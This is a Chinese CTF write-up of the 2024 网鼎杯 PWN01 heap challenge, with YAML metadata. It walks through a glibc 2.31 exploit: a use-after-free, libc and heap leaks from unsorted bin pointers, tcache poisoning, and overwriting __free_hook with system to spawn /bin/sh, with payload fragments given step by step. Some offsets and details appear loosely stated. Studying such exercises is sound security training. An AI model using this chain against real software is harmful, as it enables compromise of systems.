---
title: web选手入门pwn(20) 网鼎杯PWN01
contest: 网鼎杯
year: 2024
difficulty: medium
vuln_type: heap_exploit
tags: [glibc-2.31, unsorted-bin, tcache, __free_hook, leak-libc, leak-heap]
attack_chain: add(0x4f8)+add(0x98)交错布局让unsorted bin跨越两chunk/free(0)free(2)留下libc+heap指针在fd/bk/add(0x4f8)#c4+c5做show同时泄heap_N(main_arena_N)算libc_base/edit偏移0x50d修链表/add(0x4f8)fake chunk指向__free_hook-8/add(0x98)/bin/sh填充+system覆盖
key_payload: free(8) 触发 system("/bin/sh")  其中 c8 chunk 内填 p64("/bin/sh\x00")
one_liner: 网鼎杯 PWN01，glibc 2.31 unsorted bin attack + tcache poison 覆盖 __free_hook=system 经典题。
lesson: 0x4f8 落在 unsorted bin 范围，0x98 落在 tcache 范围；先用 0x4f8 大块 free 残留 main_arena 指针泄 libc，再用 0x98 链做 tcache 篡改；edit 用单字节 8 字节写改链表节点偏移实现 cross-bin 篡改。
quality: medium
---

# web选手入门pwn(20) 网鼎杯 PWN01

## 漏洞
- add(size, content) / free(index) / edit(addr) / show(index) 4 个函数
- free 索引未清零，UAF 风险
- edit 接受任意地址作为 content 写入目标，存在单字节写能力

## 利用步骤

### Stage 1: 双重泄漏
- 申请 `add(0x4f8) #c0`、`add(0x98) #c1`、`add(0x4f8) #c2`、`add(0x98) #c3`
- `free(0)` 触发 c0 (0x4f8) 落入 unsorted bin，c1 (0x98) 仍占用防止 top chunk 合并
- `free(2)` 触发 c2 (0x4f8) 落入 unsorted bin，c3 隔离 top
- `add(0x4f8) #c4` 从 unsorted bin 取出，c0 位置被复用，c2 残留 fd/bk = main_arena_N
- `add(0x4f8) #c5` 取出 c2 位置
- `show(4)` 读 c4 fd 拿 heap_N（残留 0x55 起始地址）
- `show(5)` 读 c5 fd 拿 main_arena_N 算 libc_base

### Stage 2: 链表编辑
- `add(0x98) #c6` 后 `free(6) free(1) free(3)` 让 0x98 tcache 链含 c6 → c1 → c3
- `edit(heap_N + 0x50d)` 单字节/8 字节写，把 c3 的 fd 改成 `0x55555555b700`（c2 复用区）
- 含义：让 tcache 0x98 bin 的 next 指针指向 fake chunk 区

### Stage 3: 申请到 fake chunk
- `free(4)` 把 c4 释放
- `add(0x4f8, "A"*0x460 + p64(__free_hook + libc_base - 8))` 在 c4 旧址布局 fake chunk，使 0x98 邻接块指向 `__free_hook - 8`
- `add(0x98, "/bin/sh\x00") #c8` 取 c6
- `add(0x98) #c9` 取 c1
- `add(0x98, p64(system + libc_base) + p64(system + libc_base)) #c10` 命中 fake chunk，覆盖 `__free_hook = system`
- `free(8)` 触发 c8 的 free，参数是 "/bin/sh\x00"，调 system

## 经验提炼
- 0x4f8 size 正好超过 tcache 上限（0x410），确保走 unsorted bin
- 0x98 size 在 tcache 范围，tcache 篡改成本低
- edit 的单字节 8 字节写能力很关键，能跨 bin 改 fd
- heap_N + 0x50d 偏移定位到 c2 fake chunk 区的 next 指针（不同 libc 不同）
